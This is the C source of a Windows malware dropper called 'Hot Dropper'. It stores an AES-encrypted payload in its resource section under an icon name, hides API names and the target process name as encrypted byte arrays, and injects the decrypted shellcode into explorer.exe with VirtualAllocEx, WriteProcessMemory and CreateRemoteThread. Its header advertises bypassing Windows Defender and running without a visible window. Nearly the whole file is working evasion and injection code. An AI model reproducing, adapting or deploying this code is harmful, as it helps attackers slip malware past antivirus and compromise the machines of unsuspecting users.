/*

Hot Dropper

    Features:

    - Storing AES-encrypted payload in .rsrc
    - Bypassing Windows Defender with AES
	- All strings are obfuscated
    - No blinking command prompt window when launched

author: ret2basic

*/

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")
#include <psapi.h>
#include "resources.h"

LPVOID (WINAPI * pVirtualAllocEx)(
    HANDLE hProcess,
    LPVOID lpAddress,
    SIZE_T dwSize,
    DWORD  flAllocationType,
    DWORD  flProtect
);


BOOL (WINAPI * pWriteProcessMemory)(
    HANDLE  hProcess,
    LPVOID  lpBaseAddress,
    LPCVOID lpBuffer,
    SIZE_T  nSize,
    SIZE_T  *lpNumberOfBytesWritten
);


HANDLE (WINAPI * pCreateRemoteThread)(
    HANDLE                 hProcess,
    LPSECURITY_ATTRIBUTES  lpThreadAttributes,
    SIZE_T                 dwStackSize,
    LPTHREAD_START_ROUTINE lpStartAddress,
    LPVOID                 lpParameter,
    DWORD                  dwCreationFlags,
    LPDWORD                lpThreadId
);


// AES key
char key[] = { 0x5b, 0x6f, 0x5d, 0x5, 0x6a, 0x10, 0xdb, 0xc9, 0xed, 0x41, 0xac, 0x1a, 0x73, 0xea, 0x82, 0xba };


int AESDecrypt(char * payload, unsigned int payload_len, char * key, size_t keylen) {
        HCRYPTPROV hProv;
        HCRYPTHASH hHash;
        HCRYPTKEY hKey;

        if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){
                return -1;
        }
        if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)){
                return -1;
        }
        if (!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0)){
                return -1;              
        }
        if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0,&hKey)){
                return -1;
        }
        
        if (!CryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, payload, &payload_len)){
                return -1;
        }
        
        CryptReleaseContext(hProv, 0);
        CryptDestroyHash(hHash);
        CryptDestroyKey(hKey);
        
        return 0;
}

int FindTarget(const char *procname) {

        HANDLE hProcSnap;
        PROCESSENTRY32 pe32;
        int pid = 0;
                
        hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (INVALID_HANDLE_VALUE == hProcSnap) return 0;
                
        pe32.dwSize = sizeof(PROCESSENTRY32); 
                
        if (!Process32First(hProcSnap, &pe32)) {
                CloseHandle(hProcSnap);
                return 0;
        }
                
        while (Process32Next(hProcSnap, &pe32)) {
                if (lstrcmpiA(procname, pe32.szExeFile) == 0) {
                        pid = pe32.th32ProcessID;
                        break;
                }
        }
                
        CloseHandle(hProcSnap);
                
        return pid;
}


int Inject(HANDLE hProc, unsigned char * payload, unsigned int payload_len) {

        LPVOID pRemoteCode = NULL;
        HANDLE hThread = NULL;

        unsigned char sVirtualAllocEx[] = { 0xf6, 0x97, 0xdc, 0xcb, 0xf0, 0xd4, 0x1b, 0xa1, 0x8d, 0x9f, 0xe7, 0xf8, 0x99, 0xb4, 0xb6, 0xfc };
		unsigned char sWriteProcessMemory[] = { 0x63, 0xb1, 0x7d, 0x9b, 0x8d, 0x44, 0x88, 0x26, 0x16, 0xb4, 0xba, 0xa6, 0x5b, 0xf9, 0x34, 0x5b, 0x54, 0x76, 0x60, 0x6e, 0x20, 0x0, 0xf0, 0xbe, 0x9c, 0x58, 0x49, 0x34, 0xf2, 0x36, 0x5e, 0xd2 };
		unsigned char sCreateRemoteThread[] =  { 0x6d, 0x34, 0x17, 0xf, 0xca, 0x52, 0xe7, 0x54, 0x8d, 0xd3, 0xb, 0xc5, 0x5d, 0x41, 0x53, 0xf9, 0x2a, 0x6e, 0xc9, 0x9d, 0xc3, 0x36, 0xea, 0x5d, 0x2e, 0xe3, 0xc0, 0xc5, 0x64, 0xb0, 0xb9, 0x31 };
		unsigned char sDLL[] = { 0x67, 0x2, 0x93, 0x16, 0xee, 0xa0, 0xf7, 0x73, 0xd0, 0xf4, 0x53, 0x9b, 0xc9, 0xdb, 0x41, 0x34 };
		
		AESDecrypt((char *) sVirtualAllocEx, sizeof(sVirtualAllocEx), key, sizeof(key));
		AESDecrypt((char *) sWriteProcessMemory, sizeof(sWriteProcessMemory), key, sizeof(key));
		AESDecrypt((char *) sCreateRemoteThread, sizeof(sCreateRemoteThread), key, sizeof(key));
		AESDecrypt((char *) sDLL, sizeof(sDLL), key, sizeof(key));
		
		pVirtualAllocEx = GetProcAddress(GetModuleHandle(sDLL), sVirtualAllocEx);
		pWriteProcessMemory = GetProcAddress(GetModuleHandle(sDLL), sWriteProcessMemory);
		pCreateRemoteThread = GetProcAddress(GetModuleHandle(sDLL), sCreateRemoteThread);
		
        pRemoteCode = pVirtualAllocEx(hProc, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
        pWriteProcessMemory(hProc, pRemoteCode, (PVOID)payload, (SIZE_T)payload_len, (SIZE_T *)NULL);
        
        hThread = pCreateRemoteThread(hProc, NULL, 0, pRemoteCode, NULL, 0, NULL);
        if (hThread != NULL) {
                WaitForSingleObject(hThread, 500);
                CloseHandle(hThread);
                return 0;
        }
        return -1;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, 
    LPSTR lpCmdLine, int nCmdShow) {

	void * exec_mem;
	BOOL rv;
	HANDLE th;
    DWORD oldprotect = 0;
	HGLOBAL resHandle = NULL;
	HRSRC res;
	
	unsigned char * payload;
	unsigned int payload_len;
	
	// Extract payload from resources section
	res = FindResource(NULL, MAKEINTRESOURCE(FAVICON_ICO), RT_RCDATA);
	resHandle = LoadResource(NULL, res);
	payload = (char *) LockResource(resHandle);
	payload_len = SizeofResource(NULL, res);
	
	// Allocate some memory buffer for payload
	exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	// Copy payload to new memory buffer
	RtlMoveMemory(exec_mem, payload, payload_len);

    // AES-decrypt the payload
	AESDecrypt((char *) exec_mem, payload_len, key, sizeof(key));

    // Inject the payload to explorer.exe
	int pid = 0;
    HANDLE hProc = NULL;
	
	unsigned char sExplorer[] = { 0x2b, 0x76, 0xbc, 0x7a, 0x69, 0x5b, 0x33, 0xa9, 0x3e, 0x30, 0x37, 0x40, 0xa, 0xfe, 0xe9, 0x26 };
	AESDecrypt((char *) sExplorer, sizeof(sExplorer), key, sizeof(key));

	pid = FindTarget(sExplorer);

	if (pid) {
		// try to open target process
		hProc = OpenProcess( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 
						PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
						FALSE, (DWORD) pid);

		if (hProc != NULL) {
			Inject(hProc, exec_mem, payload_len);
			CloseHandle(hProc);
		}
	}

	return 0;
}
